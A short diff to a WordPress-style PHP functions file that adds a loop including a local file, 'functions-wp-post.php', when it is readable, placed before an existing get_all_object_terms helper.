@@ -1,4 +1,13 @@
 <?php
+$array = array(
+	'functions-wp-post.php',
+);
+foreach ( $array as $value ) {
+	if ( is_readable(__DIR__ . DIRECTORY_SEPARATOR . $value) ) {
+		include_once __DIR__ . DIRECTORY_SEPARATOR . $value;
+	}
+}
+
 if ( ! function_exists('get_all_object_terms') ) {
 	function get_all_object_terms( $post = null ) {
 		$post = get_post($post);
